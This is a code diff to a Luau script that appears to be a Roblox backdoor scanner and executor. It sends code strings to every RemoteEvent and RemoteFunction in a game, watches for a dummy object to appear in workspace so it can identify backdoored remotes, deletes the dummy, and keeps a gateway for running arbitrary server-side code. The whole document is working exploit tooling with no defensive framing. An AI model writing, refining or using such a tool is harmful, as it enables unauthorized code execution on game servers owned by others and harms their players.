@@ -19,14 +19,14 @@
 
 --// TYPES \\--
 export type LikelyBackdoor = RemoteEvent|RemoteFunction;
-export type IsBackdoor = (LikelyBackdoor) -> boolean;
+export type MakeDummy = (LikelyBackdoor, string) -> nil;
 export type ExecuteBackdoor = (BackdoorGateway, ...any) -> any;
 
 -- @BackdoorSolver
 -- Solvers allow us to provide a maintanable way of
 -- adding new backdoors detections and executions.
 export type BackdoorSolver = {
-    IsBackdoor: IsBackdoor,
+    makeDummy: MakeDummy,
     Execute: ExecuteBackdoor
 }
 
@@ -40,6 +40,7 @@ export type BackdoorGateway = {
 --// GLOBALS \\--
 
 local BACKDOOR_SOLVER : {BackdoorSolver} = {};
+local URSTRING_TO_BACKDOOR : {[string]:BackdoorGateway} = {};
 local ALPHABET = {
     "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
     "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
@@ -93,24 +94,25 @@ local function urString(len:number, parent:Instance?)
     return name;
 end;
 
+-- wrap to make a BackdoorGateway
+local function makeGateway(r:LikelyBackdoor, s:BackdoorSolver) : BackdoorGateway
+    return {
+        b = r,
+        Execute = s.Execute
+    };
+end;
+
 --// SOLVERS \\--
 
 -- [[COMMON BACKDOOR SOLVER]]
 -- @detection by performing a remote run and instanciating a dummy instance
 -- @execution_param code:string
 BACKDOOR_SOLVER[1] = {
-    IsBackdoor = function(r:LikelyBackdoor)
-        local randName = urString(8, workspace);
+    makeDummy = function(r:LikelyBackdoor, dummyName:string)
         local src = ('local d = Instance.new("BoolValue",workspace);d.Name = "%s";'):format(
-            randName
+            dummyName
         );
         runRemote(r, src);
-        if workspace:FindFirstChild(randName) then
-            -- destroy dummy
-            src = ('workspace:FindFirstChild("%s"):Destroy();'):format(randName);
-            runRemote(r, src);
-            return true;
-        end
     end,
     Execute = function(g:BackdoorGateway, code:string)
         return runRemote(g.b, code);
@@ -143,23 +145,35 @@ local function scan() : {BackdoorGateway}
     -- retrive remotes
     local remotes = getRemotes();
     local backdoors = {};
+    -- listen workspace new instances
+    local connection = workspace.ChildAdded:Connect(function(child)
+        local gateway = URSTRING_TO_BACKDOOR[child.Name];
+        if gateway then
+            -- destroy dummy
+            task.wait();
+            local src = ('workspace:FindFirstChild("%s"):Destroy();'):format(child.Name);
+            gateway:Execute(src);
+            -- store backdoor
+            table.insert(backdoors, gateway);
+        end;
+    end);
     -- loop all remotes
     for i, r in next, remotes do
         -- loop solvers
         for j, s in next, BACKDOOR_SOLVER do
-            if s.IsBackdoor(r) then
-                -- create a new backdoor gateway
-                local g = {
-                    b = r,
-                    Execute = s.Execute
-                };
-                -- save it
-                table.insert(backdoors, g);
-                -- no need to check others solver
-                break;
-            end;
+            -- create a new backdoor gateway
+            local g = makeGateway(r, s);
+            -- this will ensure we generate an unique string inside URSTRING_TO_BACKDOOR and workspace
+            local dummyName = urString(5, workspace) .. i .. j;
+            -- register gateway
+            URSTRING_TO_BACKDOOR[dummyName] = g;
+            -- make dummy test
+            s.makeDummy(r, dummyName);
         end;
     end;
+    task.wait(0.800); -- wait 800 ms for a possible dummy detection
+    connection:Disconnect();
+    table.clear(URSTRING_TO_BACKDOOR); -- clear URSTRING_TO_BACKDOOR
     -- return
     return backdoors;
 end;
